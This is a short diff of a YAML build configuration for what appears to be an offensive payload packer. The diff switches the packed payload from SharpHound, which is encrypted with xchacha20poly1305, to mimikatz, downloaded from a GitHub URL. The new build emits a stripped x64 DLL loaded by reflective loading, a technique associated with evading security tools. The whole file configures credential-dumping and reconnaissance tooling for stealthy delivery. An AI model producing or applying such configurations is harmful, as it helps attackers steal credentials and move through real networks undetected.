@@ -1,16 +1,15 @@
-schema: 4
-name: x86-arch
+schema: 6
+name: mimi-dll
 build:
-  payload:
-    source: ./SharpHound.exe
-    format: dotnet
-    crypto:
-      algo: xchacha20poly1305
-      key: random
+  payloads:
+    mimikatz:
+      source: "https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/x64/mimikatz.exe"
   output:
-    path: ./dist/x86-arch.exe
-    arch: x86
+    path: ./dist/mimi-dll.dll
+    kind: dll
+    entry: auto
+    arch: x64
     strip: true
     trim_paths: all
 runtime:
-  - technique: dotnet_hosting
+  - technique: reflective_loading
